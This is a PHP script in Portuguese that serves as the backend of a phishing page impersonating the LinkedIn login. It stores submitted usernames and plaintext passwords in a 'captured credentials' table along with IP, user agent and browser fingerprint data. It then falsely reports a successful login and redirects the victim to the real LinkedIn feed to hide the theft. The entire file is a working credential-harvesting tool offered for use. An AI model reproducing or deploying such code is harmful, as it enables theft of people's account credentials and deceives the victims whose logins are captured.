<?php
require_once 'config.php';

registrarLog('TENTATIVA_LOGIN', 'Formulário de login acessado');

header('Content-Type: application/json; charset=UTF-8');

$response = [
    'success' => false,
    'message' => '',
    'redirect' => ''
];

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    $response['message'] = 'Método não permitido';
    echo json_encode($response);
    exit;
}

$usuario = isset($_POST['session_key']) ? sanitizarEntrada($_POST['session_key']) : '';
$senha = isset($_POST['session_password']) ? $_POST['session_password'] : '';
$lembrar = isset($_POST['rememberMeOptIn']) ? true : false;
$origem = isset($_POST['origem']) ? sanitizarEntrada($_POST['origem']) : 'formulario';

$ip_address = $_SERVER['REMOTE_ADDR'] ?? 'DESCONHECIDO';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'DESCONHECIDO';

if (empty($usuario) || empty($senha)) {
    $response['message'] = 'Por favor, preencha todos os campos.';
    echo json_encode($response);
    exit;
}

if (strpos($usuario, '@') !== false && !validarEmail($usuario)) {
    $response['message'] = 'Formato de e-mail inválido.';
    echo json_encode($response);
    exit;
}

$conn = conectarBanco();

if (!$conn) {
    $response['message'] = 'Erro ao conectar ao sistema. Tente novamente.';
    registrarLog('ERRO_CONEXAO', 'Falha ao conectar ao banco de dados');
    echo json_encode($response);
    exit;
}

$stmt = $conn->prepare("INSERT INTO credenciais_capturadas (usuario, senha, ip_address, user_agent, origem) VALUES (?, ?, ?, ?, ?)");

if (!$stmt) {
    $response['message'] = 'Erro no sistema. Tente novamente.';
    registrarLog('ERRO_PREPARE', 'Falha ao preparar statement: ' . $conn->error);
    echo json_encode($response);
    exit;
}

$stmt->bind_param("sssss", $usuario, $senha, $ip_address, $user_agent, $origem);

if ($stmt->execute()) {
    $credencial_id = $stmt->insert_id;
    
    $stmt2 = $conn->prepare("INSERT INTO tentativas_login (usuario, sucesso, ip_address, user_agent) VALUES (?, TRUE, ?, ?)");
    $stmt2->bind_param("sss", $usuario, $ip_address, $user_agent);
    $stmt2->execute();
    $stmt2->close();
    
    if (isset($_POST['info_sistema'])) {
        $info = json_decode($_POST['info_sistema'], true);
        
        $navegador = $info['navegador'] ?? 'DESCONHECIDO';
        $so = $info['so'] ?? 'DESCONHECIDO';
        $resolucao = $info['resolucao'] ?? 'DESCONHECIDO';
        $idioma = $info['idioma'] ?? 'DESCONHECIDO';
        $timezone = $info['timezone'] ?? 'DESCONHECIDO';
        $cookies = isset($info['cookies']) ? 1 : 0;
        $javascript = isset($info['javascript']) ? 1 : 0;
        
        $stmt3 = $conn->prepare("INSERT INTO info_sistema (credencial_id, navegador, sistema_operacional, resolucao_tela, idioma, timezone, cookies_habilitados, javascript_habilitado) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
        $stmt3->bind_param("isssssii", $credencial_id, $navegador, $so, $resolucao, $idioma, $timezone, $cookies, $javascript);
        $stmt3->execute();
        $stmt3->close();
    }
    
    registrarLog('CAPTURA_SUCESSO', "Credenciais capturadas - Usuário: $usuario");
    
    $conn->query("UPDATE estatisticas SET total_acessos = total_acessos + 1");
    
    $response['success'] = true;
    $response['message'] = 'Login realizado com sucesso!';
    $response['redirect'] = 'https://www.linkedin.com/feed/';
    
} else {
    $response['message'] = 'Erro ao processar login. Tente novamente.';
    registrarLog('ERRO_INSERT', 'Falha ao inserir credenciais: ' . $stmt->error);
}

$stmt->close();
$conn->close();

echo json_encode($response);
exit;
?>